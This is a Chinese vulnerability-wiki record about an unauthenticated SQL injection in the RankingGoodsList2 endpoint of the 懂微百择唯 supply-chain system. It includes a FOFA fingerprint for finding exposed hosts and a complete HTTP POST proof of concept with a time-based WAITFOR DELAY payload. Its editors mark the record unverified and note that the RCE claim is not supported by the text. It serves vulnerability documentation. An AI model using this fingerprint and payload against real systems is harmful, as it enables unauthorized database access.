---
source: "SourByte05/Vulnerability-Wiki-PoC"
title: "懂微百择唯供应链 RankingGoodsList2 SQL注入声称到远程代码执行"
product: "懂微百择唯供应链"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "SQL Server，版本未知"
prerequisites: "匿名声称"
side_effects: "命令/代码执行示例可能改变主机状态"
review_date: "2026-10-02"
source_url: "https://github.com/SourByte05/Vulnerability-Wiki-PoC"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E6%87%82%E5%BE%AE%E7%99%BE%E6%8B%A9/%E6%87%82%E5%BE%AE%E7%99%BE%E6%8B%A9%E5%94%AF%C2%B7%E4%BE%9B%E5%BA%94%E9%93%BE%20RankingGoodsList2%20SQL%E6%B3%A8%E5%85%A5%E8%87%B4RCE%E6%BC%8F%E6%B4%9E.md"
fofa: "body=\"/Content/Css/_SiteCss/\""
fofa_unverified: "body="
id: "vw-2af5e2ceed43ac9cab898494"
entity_id: "ve-2af5e2ceed43ac9cab898494"
schema_version: "1"
---

# 懂微百择唯供应链 RankingGoodsList2 SQL注入声称到远程代码执行

## 条目说明

- 对象与具体问题：懂微百择唯供应链；RankingGoodsList2 SQL注入声称到RCE
- 版本、配置及部署条件：SQL Server，版本未知
- 认证与权限前提：匿名声称
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 标题致RCE但文本只5秒SQL等待，系统执行需DB高权/功能开启等独立条件
- 在野已知与广影响无出处，修复无版本/链接
- 补响应文字并保留截图候选

## 操作风险

命令/代码执行示例可能改变主机状态。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

## 漏洞描述

懂微百择唯·供应链 RankingGoodsList2 接口存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。

## 影响版本

懂微百择唯·供应链

## **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 原文提供部分细节 | 见技术资料 | 未独立核验 | 待来源核实 |

### 风险等级

| 维度 | 评价 |
|----|----|
| 威胁等级 | 高危 |
| 影响面 | 广 |
| 攻击者价值 | 高 |
| 利用难度 | 低 |

## 漏洞复现

FOFA：body="/Content/Css/_SiteCss/"

POC/EXP：

```http
POST /Goods/RankingGoodsList2 HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.60 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: keep-alive

goodsSortType=Recommend&goodsTypeList%5B%5D=1%';WAITFOR DELAY '0:0:5'--
```


![image-20241120163124177](./.resource/懂微百择唯·供应链RankingGoodsList2SQL注入致RCE漏洞/media/image-20241120163124177.png)


![image-20241120163210583](./.resource/懂微百择唯·供应链RankingGoodsList2SQL注入致RCE漏洞/media/image-20241120163210583.png)


## 漏洞修复

关闭互联网暴露面或接口设置访问权限

升级至安全版本


---

> 来源：SourByte05/Vulnerability-Wiki-PoC（https://github.com/SourByte05/Vulnerability-Wiki-PoC）
